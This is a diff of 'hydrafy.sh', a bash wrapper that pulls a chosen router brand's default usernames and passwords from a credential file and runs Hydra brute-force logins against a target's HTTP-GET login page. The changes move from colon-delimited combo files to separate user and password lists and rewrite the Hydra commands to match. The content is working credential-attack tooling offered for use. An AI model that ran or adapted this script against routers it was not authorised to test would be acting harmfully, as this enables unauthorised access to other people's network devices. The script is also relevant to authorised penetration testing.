@@ -3,7 +3,7 @@ function script_info--()
 {
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## Filename: hydrafy.sh
-## Version: 0.1
+## Version: 0.3
 ## Copyright (C) <2012>  <Snafu>
 
 ##  This program is free software: you can redistribute it and/or modify
@@ -61,6 +61,7 @@ function script_info--()
 
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ To Do ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
+## Implement update feature
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -70,12 +71,11 @@ function script_info--()
 
 ## Support for the Router Attack method is limited to browser-based http-get requests right now,
 ## Feel free to do the work for me, if your work is good....I'll implement it and give you credit
-
-##I learned the value of a null variable check while writing this script
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~## 
 
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Bug Traq ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
+## Hydra does not properly process a colon delimited file via the -C flag.  As an example use zyxel routers and watch the output of hydra, then compare against snakebite.txt.  This method has current been suspended until a patch for hydra is released.
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -98,11 +98,10 @@ clear
 echo -e "\033[1;34m
 Hydrafy {Aka HydraFu}
 Author: Snafu ----> will@configitnow.com
-Ver 0.1 (31 January 2012)
+Version \033[1;33m$current_ver\033[1;34m (\033[1;33m$rel_date\033[1;34m)\033[1;32m
 Read Comments Prior to Usage"
 echo -e "\033[1;32m
 Usage:
-
 ./hydrafy -f <file to be parsed> -r <brand of router to parse for>
 "
 }
@@ -147,7 +146,7 @@ function display--()
 {
 echo -e "\033[1;33m
 --------------------------------------------------------"
-grep -i $ROUTER $FILE | awk '{ print $2":"$3 }'
+grep -i $ROUTER $FILE | awk -F\| '{ print $2":"$3 }'
 echo "--------------------------------------------------------
 
 The names above were derived from this series of routers: $ROUTER
@@ -161,7 +160,8 @@ while [ -z $SAVE ];do
 	echo -e "\033[36m\nFile Name?"
 	read SAVE
 done
-grep -i $ROUTER $FILE | awk '{ print $2":"$3 }' > $SAVE
+
+grep -i $ROUTER $FILE | awk -F\| '{ print $2":"$3 }' > $SAVE
 echo -e "\033[1;33m
 File Written to: $SAVE
 
@@ -172,15 +172,11 @@ File data derived from this series of routers: $ROUTER
 function hydrafy--()
 {
 ip= ## Tgt address for hydra
-ques= ## past root variable
 at= ## path for past root
-grep -i $ROUTER $FILE | awk '{ print $2":"$3 }' > snakebite.txt
-## I know what you are thinking, I should have wrote an if statement above to see
-## if the snakebite.txt file already exists....
-## On the contrary, you should have read my script prior to running it
-## Don't complain to me about overwriting some file of yours....Tsk...Tsk...
+# grep -i $ROUTER $FILE | awk -F\| '{ print $2":"$3 }' > snakebite.txt
+grep -i $ROUTER $FILE | awk -F\| '{ print $2 }' > user.txt
+grep -i $ROUTER $FILE | awk -F\| '{ print $3 }' > pass.txt
 
-## If the above does not apply to you, then no worries
 echo -e "\033[1;36m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 echo -e "\033[1;34m
@@ -199,32 +195,43 @@ Tgt IP/Hostname? -----> {http:// is assumed by default} <-----"
 	read ip
 done
 while [ -z $ques ];do
-	echo -e -n "\033[36m\nDoes the URL extend past root? <yes or no>"
+	echo -e "\033[36m\nDoes the URL extend past root? <y or n>"
 	read ques
+	case $ques in
+		y|Y) extend="yes" ;;
+		n|N) extend="no" ;;
+		*) ques= ;; ## Nulled
+	esac
+
 done
-if [[ $ques = yes || $ques = y ]]; then
-	while [ -z $at ];do
+
+case $extend in
+	yes) while [ -z $at ];do
 		echo -e "\033[36m\nWhat is the path past root?"
 		read at
-	done
-	clear
-### Must add echo that shows the snakebite.txt file location
-	hydra $ip -C snakebite.txt -t 1 -e ns -V -f http-get /"$at"
-else
-	clear
-	hydra $ip -C snakebite.txt -t 1 -e ns -V -f http-get /
-fi
+done
+
+clear
+# hydra $ip -C snakebite.txt -t 1 -V -f http-get /"$at" ;;
+hydra $ip -L user.txt -P pass.txt -t 1 -V -f http-get /"$at" ;;
+
+	no) clear
+# 	hydra $ip -C snakebite.txt -t 1 -V -f http-get / ;;
+ 	hydra $ip -L user.txt -P pass.txt -t 1 -V -f http-get / ;;
+esac
 }
 
 while getopts "f:r:" options; do
   case $options in
-    f ) FILE=$OPTARG;;
-    r ) ROUTER=$OPTARG;;
-    * ) usage--;;
+    f) FILE=$OPTARG;;
+    r) ROUTER=$OPTARG;;
+    *) usage--;;
 
   esac
 done
 
+current_ver="0.3"
+rel_date="1 February 2012"
 if [[ -n "$FILE" && -n "$ROUTER" ]]; then
 	menu--
 else
